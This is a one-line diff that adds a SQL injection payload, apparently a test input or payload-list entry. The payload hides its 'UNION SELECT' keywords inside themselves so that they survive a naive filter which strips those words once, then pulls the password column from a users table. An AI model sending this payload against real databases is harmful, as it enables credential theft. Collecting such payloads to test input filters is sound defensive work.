@@ -1,0 +1,1 @@
+1 UNunionION SELselectECT 0, password FRfromOM users where id = 1
